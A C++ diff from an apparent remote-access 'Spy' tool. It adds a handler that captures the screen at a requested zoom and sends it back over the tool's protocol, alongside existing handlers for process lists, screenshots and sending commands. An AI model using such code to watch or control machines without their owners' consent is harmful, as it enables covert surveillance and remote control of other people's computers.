@@ -27,6 +27,7 @@ namespace Spy {
 	    (*proto)["WARNING"].sig_recv.connect(boost::bind(&session_on_spy::do_warning, this, _1));
 	    (*proto)["GET_LIST_PROC"].sig_recv.connect(boost::bind(&session_on_spy::do_get_list_proc, this, _1));
 	    (*proto)["GET_SCREENSHOT"].sig_recv.connect(boost::bind(&session_on_spy::do_get_screenshot, this, _1));
+	    (*proto)["GET_BIG_SCREENSHOT"].sig_recv.connect(boost::bind(&session_on_spy::do_get_big_screenshot, this, _1));
 	    (*proto)["SEND_CMD"].sig_recv.connect(boost::bind(&session_on_spy::do_send_cmd, this, _1));
 	}
 
@@ -76,6 +77,27 @@ namespace Spy {
 	    cout << ss.str().length() << endl;
 	    (*proto)("SCREENSHOT")(ss.str(), w, h);
 	}
+
+	void do_get_big_screenshot(string data) {
+	    stringstream s1, ss;
+	    s1 << data;
+	    double zoom;
+	    s1 >> zoom;
+      
+	    ScreenShot sc(zoom);
+	    int w, h;
+	    cout << "zoom : " << zoom << endl;
+	    sc.save("bigtest.bmp");
+	    sc.get_stringstream("bigtest.bmp", ss, w, h, zoom);
+
+	    ofstream f("truc");
+	    f << ss.rdbuf();
+	    f.close();
+
+	    cout << ss.str().length() << endl;
+	    (*proto)("BIG_SCREENSHOT")(ss.str(), w, h);
+	}
+
 
 	void do_send_cmd(string _cmd) {
 	    Cmd cmd;
